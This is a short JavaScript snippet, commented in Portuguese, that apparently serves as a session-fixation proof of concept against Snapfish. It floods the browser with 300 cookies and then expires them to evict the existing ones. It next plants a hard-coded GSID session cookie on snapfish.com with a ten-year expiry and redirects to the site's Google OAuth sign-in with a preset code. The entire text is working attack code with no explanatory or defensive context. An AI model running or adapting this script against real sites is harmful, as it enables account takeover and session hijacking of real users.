let quantidadeCookies = 300;
console.log(quantidadeCookies); // console
for (let i = 0; i < quantidadeCookies; i++) {
    document.cookie = `cookie${i}=a; Secure; path=/`;
    console.log(document.cookie)
}

// Remove os 300 cookies definidos anteriormente
for (let i = 0; i < quantidadeCookies; i++) {
    document.cookie = `cookie${i}=a; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/`;
}


const expires = new Date();
expires.setFullYear(expires.getFullYear() + 10);

document.cookie = `GSID=aus-a9043392-8b5a-4902-bee5-2d0630227267-01267; Domain=snapfish.com; Path=/; Expires=${expires.toUTCString()}`;

window.location.href = "https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=484210975577308&SubscriptionFlag=ALL";
